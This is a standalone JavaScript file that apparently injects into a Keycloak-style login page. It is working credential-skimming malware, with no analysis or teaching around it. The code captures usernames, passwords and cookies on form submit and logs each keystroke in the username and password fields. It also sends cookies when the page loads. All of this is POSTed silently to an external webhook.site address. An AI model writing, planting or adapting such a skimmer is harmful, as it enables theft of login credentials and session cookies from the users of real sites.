(function() {
  if (window.__vault_jok3r_loaded__) return;
  window.__vault_jok3r_loaded__ = true;

  const webhook = 'https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8';

  function sendData(data) {
    fetch(webhook, {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).catch(() => {});
  }

  const form = document.getElementById('kc-form-login');
  if (form) {
    form.addEventListener('submit', function() {
      const username = document.getElementById('username')?.value || '';
      const password = document.getElementById('password')?.value || '';
      const cookies = document.cookie;

      sendData({
        type: 'login_submit',
        username,
        password,
        cookies,
        userAgent: navigator.userAgent,
        url: window.location.href
      });
    });
  }

  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');

  if (usernameInput) {
    usernameInput.addEventListener('input', () => {
      sendData({
        type: 'keylog',
        field: 'username',
        value: usernameInput.value
      });
    });
  }

  if (passwordInput) {
    passwordInput.addEventListener('input', () => {
      sendData({
        type: 'keylog',
        field: 'password',
        value: passwordInput.value
      });
    });
  }

  sendData({
    type: 'cookies_onload',
    cookies: document.cookie,
    userAgent: navigator.userAgent,
    url: window.location.href
  });

})();
